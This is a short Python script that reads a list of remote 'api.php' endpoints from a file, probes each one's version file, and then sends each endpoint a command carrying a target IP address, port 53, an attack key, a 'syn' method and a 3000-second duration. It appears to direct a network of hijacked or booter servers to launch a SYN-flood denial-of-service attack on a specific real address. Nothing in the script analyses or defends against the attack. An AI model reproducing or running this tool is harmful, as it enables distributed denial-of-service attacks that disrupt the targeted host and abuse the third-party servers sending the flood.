import requests

urls = [x.strip() for x in open('done.txt').readlines()]

target = "173.249.29.166"
port = 53
key = "etherealhehe"
method = "syn"
time = 3000

for url in urls:
    if url.startswith("# "):
        continue
    r_url = url.replace("api.php", "version.txt")
    r = requests.get(r_url)
    print(f"{r.text} - {r_url}")
    r_url = url + \
        f"?host={target}&port={port}&time={time}&key={key}&method={method}"
    requests.get(r_url)
    print(url + " done...")
